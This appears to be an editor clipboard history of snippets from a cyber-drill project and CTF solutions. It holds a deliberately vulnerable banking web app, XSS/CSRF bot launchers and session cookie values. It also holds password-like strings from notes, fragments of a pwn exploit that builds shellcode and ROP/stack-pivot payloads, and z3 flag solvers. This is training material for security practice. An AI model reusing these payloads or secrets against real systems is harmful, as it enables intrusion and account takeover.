7da788d01698164ca51cf71443383d58|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/profile.html|1|1|V|htmldjango
	{% extends "layout.html" %}
	    {% block spacer %}
	        {% include "search_bar.html" %}
	    {% endblock %}
	
	    {% block content %}
f5c0d5ed7af24d3aa55b4666cc4596a7|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|289|28|v|python
	Funny
fe0605db4790e6ddb3113e9c856d4a06|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|286|29|v|python
	funnyPictures
8ea11cbf26aaddefaad3c1ac8d5415de|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/currencies.html|8|1|V|htmldjango
		  <div class="row">
			<div class="col-md-12 logo">
			  <img src="/images/logo.png" width="250px" height="260px">
			</div>
		  </div>	  
169d4b7552d315131b2d81e57047792f|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/currencies.html|12|37|v|htmldjango
	Funny pics
8ce50a266c012b1f0bf6825882424d5d|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/currencies.html|15|20|v|htmldjango
	/funny/getFunny
1af0389838508d7016a9841eb6273962|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|293|38|v|python
	currency
32af563af9f6c3ce2140811e1fb59c28|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/currencies.html|18|28|^v|htmldjango
	Funny Pic</label>
31d1171fa465d0ea5e95cd432265a175|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/currencies.html|18|28|v|htmldjango
	Funny Pic
c69598094b304f7afa5f4cad6f42fb91|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/currencies.html|20|46|v|htmldjango
	olvo</option>
e58327c1650a16df0dac2f8dea01c120|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|314|78|^v|python
	, old=cur)
bc7801d743fd3cdd1f02cfaedcf77879|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|307|82|v|python
	, old='usd'
da5565c0e63759eb980ea858a76f08a2|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/currencies.html|25|2|V|htmldjango
						<!-- <input id="funnyPic" name="funny" type="number" min="1" max="4" step="1" value="{{ old }}" class="form-control"> -->
625be05fc67f698092843e39d76eb608|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|7|1|V|htmldjango
	    <section id="three-columns">
	
	        <div class="three-columns-wrapper">
	        
	            <article>            	               
	                <img src="/images/lightning.png" height="100px" width="100px" />                
	                <h3>Fast</h3>
	                
	                <p>Enjoy the fastest banking experience!</p>
	            </article>
	            
	            <article>            	     
	                <img src="/images/bug.png" height="100px" width="100px" />
	                
	                <h3>Reliable</h3>
	                
	                <p>Our web application is bug free and never breaks!</p>
	            </article>
	        
	            <article>            	    
	                <img src="/images/lock.png" height="100px" width="100px" />                
	                    <h3>Secure</h3>
	            
	                    <p>The best security experts make sure that your banking data is safe!</p>
	            </article>
	            
	        </div><!-- end three columns-wrapper -->
	        <br class="clear"/>
	    
	    </section>        
f63f4add7a431dc4e000f2ac64290967|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/currencies.html|40|1|V|htmldjango
			  <div class="panel panel-primary" style="margin-top:50px">
				<div class="panel-heading">
				  <h3 class="panel-title">Search Currency to find conversion rate</h3>
				</div>
				<div class="panel-body">
				  <form action="/currencies/getCurrency" method="POST">
					<fieldset>
					  <div class="form-group">
						<label for="username">Convert Euro to:</label>
	                      <select id="currency" name="currency">
	                        <option value="usd">US Dollars</option>
	                        <option value="saab">Saab</option>
	                        <option value="fiat">Fiat</option>
	                        <option value="audi">Audi</option>
	                      </select>
					  </div>
					  <div class="form-actions">
						<input type="submit" value="Retrieve" class="btn btn-primary">
					  </div>
					</fieldset>
				  </form>
				</div>
1a5ddb8ff6d073882b99ee178ee56a07|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/currencies.html|34|1|V|htmldjango
	                <img src="/images/lightning.png" height="100px" width="100px" />                
	                <h3>Fast</h3>
	                
	                <p>Enjoy the fastest banking experience!</p>
042fa5ced27b6c9067b7fca870b7668a|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/currencies.html|43|13|v|htmldjango
	<article>            	    
	                <img src="/images/lock.png" height="100px" width="100px" />                
	                    <h3>Secure</h3>
	            
	                    <p>The best security experts make sure that your banking data is safe!</p>
	            <
27c957ad6bc0c317406c82faff82eafd|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/currencies.html|43|1|V|htmldjango
	            <article>            	    
	                <img src="/images/lock.png" height="100px" width="100px" />                
	                    <h3>Secure</h3>
	            
	                    <p>The best security experts make sure that your banking data is safe!</p>
	            </article>
c97f19e23e95ae55ddf814c239bb49c1|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/currencies.html|36|1|V|htmldjango
	                <img src="/images/bug.png" height="100px" width="100px" />
	                
	                <h3>Reliable</h3>
	                
	                <p>Our web application is bug free and never breaks!</p>
1ad4d8f01563005b1fe15b4fa2ff31c9|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/currencies.html|71|1|V|htmldjango
			  <img style="width:300px; height:200px" src="data:image/jpeg;base64, {{ encoded }}">
0c0f577f2a34688974a42e51cf31edfd|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/currencies.html|43|1|V|htmldjango
	    <!-- </section> -->        
	    <!-- <div class="container"> -->
	    <!--   <div class="row"> -->
		    <!-- <div class="col-md-3"> -->
			  <!-- <div class="panel panel-primary" style="margin-top:50px"> -->
				<!-- <div class="panel-heading"> -->
				  <!-- <h3 class="panel-title">Search Currency to find conversion rate</h3> -->
				<!-- </div> -->
				<!-- <div class="panel-body"> -->
				  <!-- <form action="/currencies/getCurrency" method="POST"> -->
					<!-- <fieldset> -->
					  <!-- <div class="form-group"> -->
						<!-- <label for="username">Convert Euro to:</label> -->
	    <!--                   <select id="currency" name="currency"> -->
	    <!--                     <option value="usd">US Dollars</option> -->
	    <!--                     <option value="saab">Saab</option> -->
	    <!--                     <option value="fiat">Fiat</option> -->
	    <!--                     <option value="audi">Audi</option> -->
	    <!--                   </select> -->
					  <!-- </div> -->
					  <!-- <div class="form-actions"> -->
						<!-- <input type="submit" value="Retrieve" class="btn btn-primary"> -->
					  <!-- </div> -->
					<!-- </fieldset> -->
				  <!-- </form> -->
				<!-- </div> -->
			  <!-- </div> -->
			  <!-- </div> -->
			  <!-- <div class="col-md-9" style="margin-top:50px"> -->
			  <!-- <img style="width:300px; height:200px" src="data:image/jpeg;base64, {{ encoded }}"> -->
			<!-- </div> -->
	    <!--   </div> -->
	    <!-- </div> -->
063bba9c62c9d2212e6d57958e614f2b|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/currencies.html|39|5|V|htmldjango
	            <article></article>
14226ba6c8732789ccfab6f139deedec|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/currencies.html|8|9|V|htmldjango
	        <article></article>
2b9fbee9cdf13325836849aaf5369657|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/currencies.html|15|1|V|htmldjango
	                <div class="panel-heading">
	                  <h3 class="panel-title">Search Currency to find conversion rate</h3>
	                </div>
f73e87416c3b1970ad84178c89107ce7|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/currencies.html|12|17|V|htmldjango
	                <div class="panel-heading">
9b0db20282c2dc8d23943c66e26f1139|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/currencies.html|13|17|V|htmldjango
	                </div>
204c67216fa8cf6b253dcd1e11b66935|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/currencies.html|12|22|v|htmldjango
	 class="panel-title"
0af5732a1f3f89166af15567e334dbb7|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/currencies.html|16|1|V|htmldjango
	              <div class="panel panel-primary" style="margin-top:50px">
	                <div class="panel-body">
66babe59c52622e15b641fab84b01ee3|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|279|52|v|python
	one_does_not_simply
34b51bb1d08c46248969aab1e9a42d73|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|42|1|V|htmldjango
	                <h3>No anonymity!</h3>
	                <p>We are proudly the first bank to offer zero anonymity! Any user can search for all the transactions of another user! Just type the name of the user you want to find in the search bar!</p>	
db0543eb898a5436296706888e983e55|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|48|19|V|htmldjango
	                <br>
	                <br>
	                <br>
cb850a0a69f936dde54eab7e2c2bca3b|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|45|20|v|htmldjango
	We are proudly the first bank to offer zero anonymity! Any user can search for all the transactions of another user! Just type the name of the user you want to find in the search bar!
4a5935c9c8d59c2527c657508aa62165|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|60|65|^v|htmldjango
	<a href='/contact_us'>here</a> 
53a2c328fefc1efd85d75137a9d833ab|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|45|100|v|htmldjango
	contact_us
fc871b3573dd25005f092505cd7cecd1|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/layout.html|67|1|V|html
	                    <li><a href="/profile">Profile</a></li>
cce99c598cfdb9773ab041d54c3d973a|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/layout.html|68|47|v|html
	Profile
0e6dbb343b5edd562cc3c25a00b01c7b|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/layout.html|68|1|V|html
	                    <li><a href="/currencies">Currency Converter</a></li>
b01613dff8b48de18af2a1489d1968c5|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/layout.html|112|1|V|html
	                    <a href="/currencies">Currency Converter</a><
486e962191d98152c0965498a0942a24|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/currencies.html|22|50|v|htmldjango
	Saab
6a1547e855d0f439728a324349447740|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/currencies.html|22|44|v|htmldjango
	saab
7d5f30a0d1641c0b6980aaf2556b32ce|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/currencies.html|23|44|v|htmldjango
	fiat
c880cb1cae118d61486764f1f4a7e1e5|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/currencies.html|23|49|v|htmldjango
	Fiat
18f1308de09bede51b9d2e940404c022|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|303|56|v|python
	youve_gone_too_far
35238718c0c0c13f12bbe1560327b18d|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/currencies/test|2|15|^v|
	<img style="width:300px; height:200px" src="data:image/jpeg;base64, I
8fe01aba742e6daab4421f234772b00c|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/app_RUNESEC/bot/csrfbot.js|10|15|v|javascript
	.eJyrVspLzE1VsqpWUkhSslIKDnbKSAw3yUtxdipPcnczBbE93d0qk4zDSqMcbW2VanWUivJzEBoiw4NKgIrAEqXFqUUQ05QSU3Iz85RqAVRhHS4.DumKTQ.7OBkDLTs891zl5gkYfmaMPCRuCg
276425232483ab52dcc9cdb1792108ac|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/app_RUNESEC/bot/csrfbot.js|10|16|v|javascript
	eJyrVspLzE1VsqpWUkhSslIKDnbKSAw3yUtxdipPcnczBbE93d0qk4zDSqMcbW2VanWUivJzEBoiw4NKgIrAEqXFqUUQ05QSU3Iz85RqAVRhHS4
d537bbf7008340ecbfeb02a398b1dc16|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/app_RUNESEC/bot/csrfbot.js|10|128|v|javascript
	DumKTQ
787033c9a060a5408d37bbe3ecb6b3d6|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/app_RUNESEC/bot/csrfbot.js|11|5|V|javascript
	    'value': '.eJyrVspLzE1VsqpWUkhSslIKDnbKSAw3yUtxdipPcnczBbE93d0qk4zDSqMcbW2VanWUivJzEBoiw4NKgIrAEqXFqUUQ05QSU3Iz85RqAVRhHS4.DumKTQ.7OBkDLTs891zl5gkYfmaMPCRuCg',    
0d96fcd1737b8c6cb0be546d12da8d16|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/app_RUNESEC/bot/csrfbot.js|10|16|v|javascript
	eJyrVspLzE1VslLyVEjMzFMvUSjISawEMhQSi_JL81KUdJSK8nNA8okpuZl5QG5pcWoRVAtEqBYA5OAWFQ
d703cac4c9a515009dd94518753acc0b|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/app_RUNESEC/bot/csrfbot.js|10|99|v|javascript
	X0Osyg
135ec7f64ecc3a10aeae056e4ddd349d|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/app_RUNESEC/bot/csrfbot.js|10|15|v|javascript
	.eJyrVspLzE1VslLyVEjMzFMvUSjISawEMhQSi_JL81KUdJSK8nNA8okpuZl5QG5pcWoRVAtEqBYA5OAWFQ.X0Osyg.IdaKKCNj3A0Z-CU1ronhiiF0BOI
281d40531e35348f26b1c5502f6aecb5|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/app_RUNESEC/app_RUNESEC_notes.txt|31|7|v|text
	k>GQvA9i1k!<zbv4p8dq+v2?GDiF-#M1F#
8e7908d254642b9ad3fbf0baf8f08d30|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/app_RUNESEC/bot/csrfbot.js|9|1|V|javascript
	.eJyrVspLzE1VslLyVEjMzFMvUSjISawEMhQSi_JL81KUdJSK8nNA8okpuZl5QG5pcWoRVAtEqBYA5OAWFQ.X0OuIw.kYxAnVSjWKB85_K4Fte0d8lHkY8
37b6678d7c58146c900953d3c9eca6a6|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/app_RUNESEC/bot/csrfbot.js|11|5|V|javascript
	    'value': '.eJyrVspLzE1VslLyVEjMzFMvUSjISawEMhQSi_JL81KUdJSK8nNA8okpuZl5QG5pcWoRVAtEqBYA5OAWFQ.X0Osyg.IdaKKCNj3A0Z-CU1ronhiiF0BOI',
dbda179105a28dde0a955e9c9a2127dc|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/app_RUNESEC/app_RUNESEC_notes.txt|30|5|v|text
	%th30nE$
26abe804c2f755e8befc14929916cde1|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/app_RUNESEC/app_RUNESEC_notes.txt|33|6|v|text
	d4rkaRmy!!
450ab89ee4f61b2f686456e420c68868|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/app_RUNESEC/bot/csrfbot.js|10|1|V|javascript
	    'value': '.eJyrVspLzE1VslLyVEjMzFMvUSjISawEMhQSi_JL81KUdJSK8nNA8okpuZl5QG5pcWoRVAtEqBYA5OAWFQ.X0OuIw.kYxAnVSjWKB85_K4Fte0d8lHkY8',
2f889b767a47cb7dac93144de7863da3|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/app_RUNESEC/server.py|178|1|V|python
	    exploit = 'xss'
	    # Check if we want to trigger CSRF or XSS
	    if request.form.get('buggyURL') is not '':
	        url = request.form.get('buggyURL')
	        dropper = open('urls.txt','w')
	        dropper.write(url)
	        dropper.close()
	        exploit = 'csrf'
	
	    # Trigger bot
	    os.system('QT_QPA_PLATFORM=offscreen phantomjs --ignore-ssl-errors=true --local-to-remote-url-access=true --web-security=false --ssl-protocol=any bot/{}bot.js'.format(exploit))
dcfd93cc40db85c83a99c2b2db1f7da6|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|210|5|V|python
	    os.system('QT_QPA_PLATFORM=offscreen phantomjs --ignore-ssl-errors=true --local-to-remote-url-access=true --web-security=false --ssl-protocol=any bot/xssbot.js')
091c23436c71e8f5693b2941647f2c02|file:///home/neo/CTFs/spiderlabsctf2020/two-sets-credentials/test.py|14|1|V|python
	    # pool = ThreadPool(len(alphabet))
	    # results = pool.map(tryPassword, alphabet)
	    # pool.close() 
	    # pool.join()
440a949f8210015214cf17922e299170|file:///home/neo/247ctf/pwnable/sol_pivot.py|6|31|v|python
	executable_stack
0d56a736723ebe4868d0919ba4270f94|file:///home/neo/247ctf/pwnable/sol_pivot.py|58|13|V|python
	CALL_EAX = 0x08048410
	payload = shellcode + b'\x90' * (OFFSET - len(shellcode)) + p32(CALL_EAX)
	log.info(payload)
	io.sendline(payload)
62c027fcae7d36c7d020948bcd397413|file:///home/neo/247ctf/pwnable/sol_pivot.py|55|1|V|python
	SHELLCODE_ADDR = 0xffde9c2c
	io.recvuntil('though:\n')
acfc949e5631e5baf460c45f925c85c7|file:///home/neo/247ctf/pwnable/sol_pivot.py|50|14|v|python
	0x7ffff7f96000
eaf9e2395ee2f20bb0801de0dc3832a8|file:///home/neo/247ctf/pwnable/sol_pivot.py|51|12|v|python
	0x7fffffffdc80
4bbbfc8ed548df1ffe55855f4c90027d|file:///home/neo/247ctf/pwnable/sol_pivot.py|61|1|V|python
	io.recvuntil('?\n')
39989b6958ddd509828e6cab53822db8|file:///home/neo/247ctf/pwnable/sol_pivot.py|29|1|V|python
	            b *0x000000000040073a
81dd9f834c40803fb25f7dc5ab1d3a96|file:///home/neo/247ctf/pwnable/sol_pivot.py|67|39|v|python
	XCHG_RSP_RSI
02c726ef04e659694bcd432b241b5b42|file:///home/neo/247ctf/pwnable/sol_pivot.py|61|1|V|python
	OFFSET = 24
cbc0109f3653b27f2a3530a7a141adde|file:///home/neo/247ctf/pwnable/sol_pivot.py|61|1|V|python
	log.info('Offset: %d' % OFFSET)
015a1e64836866c27f3e63df58ec1b77|file:///home/neo/247ctf/pwnable/sol_pivot.py|60|1|V|python
	
	OFFSET = 24
	log.info('Offset: %d' % OFFSET)
b04cf9ce55807bf2fd0c4df79ae5421f|file:///home/neo/247ctf/pwnable/sol_pivot.py|51|1|V|python
	PIVOT_ADDR = 0x7ffff7f96000
d99de26c5ccb05f2fda82b6a4eecf0b7|file:///home/neo/247ctf/pwnable/sol_pivot.py|64|28|v|python
	NAME_BUF
eff5df3d990b4b91ddc75c1640156f58|file:///home/neo/247ctf/pwnable/sol_pivot.py|64|1|V|python
	io.sendline(b'a' * 8 + p64(CALL_RSP) + b'a'* 8 + p64(XCHG_RSP_RSI))
2cbe406f48b5041364e25014d29909f7|file:///home/neo/247ctf/pwnable/sol_pivot.py|65|22|^v|python
	 + p64(CALL_RSP) + b'a'* 8 + 
d428e9ed1f797fea8467c0c6bf4e1aec|file:///home/neo/247ctf/pwnable/sol_pivot.py|66|28|v|python
	CALL_RSP
1e73b60a9a605a37e58563b5c591ea3f|file:///home/neo/247ctf/pwnable/sol_pivot.py|66|28|v|python
	POP_RI
71950a38e75c89b838ace630b8d3a160|file:///home/neo/247ctf/pwnable/sol_pivot.py|67|1|V|python
	io.sendline(b'a' * 24 + p64(POP_RSI))
a61fcfeccf1630e40cfacb9162b59240|file:///home/neo/247ctf/pwnable/sol_pivot.py|67|29|v|python
	POP_RSI
3f607a49e8f5c024b7c6b17640acb195|file:///home/neo/247ctf/pwnable/sol_pivot.py|67|29|v|python
	GET_NAMES_ADDR
45fe9030d4dd1f51d10f89463ef47558|file:///home/neo/247ctf/pwnable/sol_pivot.py|67|1|V|python
	io.sendline(b'a' * 24 + p64(POP_RSI) + b"AAAAAAAA")
15a58ee3b10575d96718e56ff7c966e6|file:///home/neo/247ctf/pwnable/sol_pivot.py|66|39|v|python
	p64(NAME_BUF) 
ef4c274e842558b03e504527ec243254|file:///home/neo/247ctf/pwnable/sol_pivot.py|65|1|V|python
	# io.sendline(b'b'*48)
88d7727d0ab937b4c089a0d286cc03f0|file:///home/neo/247ctf/pwnable/sol_pivot.py|30|13|V|python
	            b *0x40079b
96af08c30e42ad7184321db1670df28a|file:///home/neo/247ctf/pwnable/sol_pivot.py|68|25|^v|python
	 + p64(PUTS_PLT) 
0b2a8199817a7dabfc530d4fe05eed09|file:///home/neo/CTFs/volga2020/export/z3-export.py|2|1|V|python
	import z3
82e19305916e51f939f3637fe4371b6d|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|2|1|V|python
	from z3 import *
c4c8284275054f34ee33d442ec9ae20f|file:///home/neo/CTFs/redpwn2020/smartsolver/solve.py|3|1|V|python
	s = Solver()
	
	string = [BitVec(f"c{i}", 8) for i in range(73)]
7ad070ac74dda1fd60d52fbb744dbc6f|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|7|1|V|python
	prefix_xors = [BitVec("p%i" % i, 32) for i in range(PASS_LENGTH)]
57ce696ccfa73860ab18518eed5c546d|file:///home/neo/247ctf/reversing/sol_lock.py|6|46|v|python
	PASS_LENGTH
eafbb505d6e850f9d33f81e90559bc74|file:///home/neo/247ctf/reversing/sol_lock.py|7|1|V|python
	flag = [BitVec(f"c{i}", 8) for i in range(40)]
b815d1c25ba272f267e67e2f0263cd87|file:///home/neo/CTFs/redpwn2020/smartsolver/solve.py|8|1|V|python
	for c in string:
	    s.add(
	        Or(
	            And(c >= 97, c <= 122),
	            c == 123,
	            c == 125
	        )
	    )
c2e3d6210a967dd0c2d0185dd6090b64|file:///home/neo/247ctf/reversing/sol_lock.py|11|13|V|python
	            c == 123,
415ece355bdeb6b5dc29971def54613c|file:///home/neo/247ctf/reversing/sol_lock.py|12|9|V|python
	        )
4a191507b67c71b0a44d305dc86e909a|file:///home/neo/247ctf/reversing/sol_lock.py|11|5|V|python
	            c == 125
92e983afdc0fae7353f2a9afb82d9eb7|file:///home/neo/247ctf/reversing/The%20Secret%20Lock.html|60679|9|v|html
	Object.keys(flag).length == 40 && ((flag[37] - flag[37]) * flag[15] == 0) && ((flag[3] + flag[31]) ^ (flag[29] + flag[8]) == 234) && ((flag[32] - flag[12]) * flag[9] == -2332) && ((flag[24] - flag[27] + flag[13]) ^ flag[6] == 114) && ((flag[38] - flag[15]) * flag[33] == 800) && ((flag[34] - flag[21]) * flag[26] == 98) && ((flag[29] + flag[0]) ^ (flag[8] + flag[38]) == 248) && ((flag[21] * flag[18]) ^ (flag[7] - flag[15]) == 2694) && ((flag[28] * flag[23]) ^ (flag[19] - flag[5]) == -9813) && ((flag[34] + flag[30]) ^ (flag[37] + flag[6]) == 72) && ((flag[23] - flag[22]) * flag[12] == 4950) && ((flag[9] * flag[28]) ^ (flag[20] - flag[11]) == 5143) && ((flag[2] * flag[22]) ^ (flag[37] - flag[0]) == 2759) && ((flag[26] - flag[12]) * flag[3] == -3350) && ((flag[35] * flag[0]) ^ (flag[23] - flag[21]) == 2698) && ((flag[20] + flag[31]) ^ (flag[5] + flag[10]) == 22) && ((flag[31] * flag[19]) ^ (flag[1] - flag[2]) == -2655) && ((flag[38] - flag[14]) * flag[18] == 55) && ((flag[29] - flag[19] + flag[10]) ^ flag[2] == 93) && ((flag[13] - flag[25] + flag[30]) ^ flag[29] == 13) && ((flag[35] + flag[33]) ^ (flag[26] + flag[21]) == 249) && ((flag[17] + flag[24]) ^ (flag[34] + flag[1]) == 253) && ((flag[32] - flag[35] + flag[19]) ^ flag[1] == 0) && ((flag[22] - flag[11] + flag[3]) ^ flag[31] == 113) && ((flag[19] - flag[0]) * flag[13] == 108) && ((flag[19] - flag[17]) * flag[14] == -2475) && ((flag[31] - flag[35] + flag[16]) ^ flag[19] == 84) && ((flag[24] * flag[27]) ^ (flag[35] - flag[17]) == -5792) && ((flag[11] * flag[35]) ^ (flag[15] - flag[28]) == -2845) && ((flag[18] - flag[19] + flag[31]) ^ flag[5] == 112) && ((flag[20] - flag[6]) * flag[10] == -3933) && ((flag[39] - flag[33]) * flag[6] == 3075) && ((flag[22] + flag[1]) ^ (flag[39] + flag[14]) == 211) && ((flag[37] * flag[24]) ^ (flag[12] - flag[39]) == -5726) && ((flag[29] + flag[3]) ^ (flag[8] + flag[11]) == 195) && ((flag[26] * flag[7]) ^ (flag[10] - flag[17]) == -2375) && ((flag[11] - flag[12]) * flag[12] == -4653) && ((flag[13] * flag[5]) ^ (flag[12] - flag[25]) == 3829) && ((flag[24] * flag[0]) ^ (flag[13] - flag[23]) == -2829) && ((flag[17] + flag[12]) ^ (flag[8] + flag[14]) == 170) && ((flag[38] + flag[23]) ^ (flag[11] + flag[1]) == 245) && ((flag[22] + flag[5]) ^ (flag[21] + flag[24]) == 19) && ((flag[35] - flag[8] + flag[21]) ^ flag[30] == 85) && ((flag[18] - flag[31] + flag[28]) ^ flag[29] == 0) && ((flag[30] * flag[35]) ^ (flag[27] - flag[29]) == 5501) && ((flag[8] - flag[30] + flag[16]) ^ flag[36] == 81) && ((flag[13] * flag[18]) ^ (flag[35] - flag[38]) == -2971) && ((flag[27] - flag[14]) * flag[39] == 5875) && ((flag[34] - flag[33]) * flag[6] == -6027) && ((flag[38] * flag[1]) ^ (flag[20] - flag[10]) == -2915) && ((flag[1] - flag[1]) * flag[3] == 0) && ((flag[36] - flag[20]) * flag[8] == 2640) && ((flag[23] - flag[11] + flag[17]) ^ flag[33] == 246) && ((flag[13] - flag[38]) * flag[0] == -100) && ((flag[28] - flag[14]) * flag[31] == 2142) && ((flag[26] + flag[15]) ^ (flag[13] + flag[31]) == 8) && ((flag[36] - flag[15]) * flag[17] == 5238) && ((flag[16] - flag[30]) * flag[33] == 0) && ((flag[2] - flag[20] + flag[13]) ^ flag[6] == 76) && ((flag[10] - flag[14] + flag[31]) ^ flag[13] == 3) && ((flag[0] * flag[10]) ^ (flag[14] - flag[31]) == 2854) && ((flag[28] - flag[34] + flag[14]) ^ flag[14] == 82) && ((flag[28] - flag[25]) * flag[1] == 2444) && ((flag[34] - flag[12]) * flag[25] == -2400) && ((flag[28] * flag[38]) ^ (flag[17] - flag[4]) == 5429) && ((flag[21] - flag[21] + flag[26]) ^ flag[23] == 84) && ((flag[9] - flag[4] + flag[18]) ^ flag[35] == 47) && ((flag[28] - flag[21] + flag[1]) ^ flag[33] == 0) && ((flag[24] - flag[25] + flag[22]) ^ flag[0] == 8) && ((flag[28] - flag[25]) * flag[12] == 4653) && ((flag[1] * flag[15]) ^ (flag[10] - flag[8]) == 2498) && ((flag[5] * flag[7]) ^ (flag[15] - flag[34]) == -3429) && ((flag[8] * flag[3]) ^ (flag[23] - flag[22]) == 3671) && ((flag[25] - flag[33]) * flag[11] == -2600) && ((flag[21] + flag[12]) ^ (flag[37] + flag[28]) == 81) && ((flag[30] + flag[33]) ^ (flag[34] + flag[14]) == 162) && ((flag[6] - flag[25]) * flag[8] == 4015) && ((flag[24] - flag[7] + flag[12]) ^ flag[7] == 90) && ((flag[18] * flag[12]) ^ (flag[8] - flag[4]) == -5466) && ((flag[32] * flag[7]) ^ (flag[32] - flag[27]) == -2730) && ((flag[32] * flag[34]) ^ (flag[29] - flag[16]) == 2804) && ((flag[25] * flag[22]) ^ (flag[28] - flag[39]) == -2542) && ((flag[8] - flag[15]) * flag[6] == 861) && ((flag[20] + flag[18]) ^ (flag[25] + flag[36]) == 245) && ((flag[5] - flag[28] + flag[14]) ^ flag[39] == 97) && ((flag[30] * flag[11]) ^ (flag[16] - flag[11]) == 5216) && ((flag[11] + flag[18]) ^ (flag[7] + flag[9]) == 13) && ((flag[9] - flag[2]) * flag[30] == -200) && ((flag[12] + flag[37]) ^ (flag[9] + flag[4]) == 78) && ((flag[10] - flag[37]) * flag[38] == -2408) && ((flag[5] * flag[19]) ^ (flag[20] - flag[21]) == 3645) && ((flag[27] * flag[29]) ^ (flag[39] - flag[21]) == 10354) && ((flag[15] * flag[32]) ^ (flag[7] - flag[22]) == -2642) && ((flag[1] - flag[3] + flag[24]) ^ flag[31] == 25) && ((flag[13] - flag[0]) * flag[30] == 400) && ((flag[18] - flag[15] + flag[36]) ^ flag[28] == 12) && ((flag[34] + flag[21]) ^ (flag[12] + flag[37]) == 163) && ((flag[36] - flag[33]) * flag[14] == 110) && ((flag[2] - flag[3]) * flag[3] == -804) && ((flag[35] - flag[27] + flag[22]) ^ flag[4] == 80) && ((flag[10] + flag[9]) ^ (flag[17] + flag[2]) == 246) && ((flag[25] * flag[4]) ^ (flag[27] - flag[23]) == 4201) && ((flag[32] * flag[19]) ^ (flag[3] - flag[25]) == 2877) && ((flag[37] - flag[14]) * flag[23] == 4545) && ((flag[32] + flag[13]) ^ (flag[31] + flag[32]) == 7) && ((flag[11] - flag[25]) * flag[39] == 250) && ((flag[17] + flag[31]) ^ (flag[6] + flag[9]) == 36) && ((flag[4] + flag[27]) ^ (flag[2] + flag[31]) == 208) && ((flag[6] + flag[7]) ^ (flag[26] + flag[21]) == 206) && ((flag[19] + flag[25]) ^ (flag[22] + flag[10]) == 10) && ((flag[34] + flag[2]) ^ (flag[8] + flag[26]) == 2) && ((flag[7] + flag[5]) ^ (flag[12] + flag[14]) == 237) && ((flag[1] - flag[13]) * flag[38] == -112) && ((flag[0] - flag[19] + flag[16]) ^ flag[0] == 80) && ((flag[31] + flag[36]) ^ (flag[3] + flag[2]) == 227) && ((flag[32] - flag[3] + flag[26]) ^ flag[4] == 113) && ((flag[3] * flag[6]) ^ (flag[16] - flag[27]) == -8241) && ((flag[24] + flag[15]) ^ (flag[2] + flag[30]) == 242) && ((flag[11] + flag[21]) ^ (flag[31] + flag[20]) == 12) && ((flag[9] - flag[26] + flag[23]) ^ flag[30] == 13)
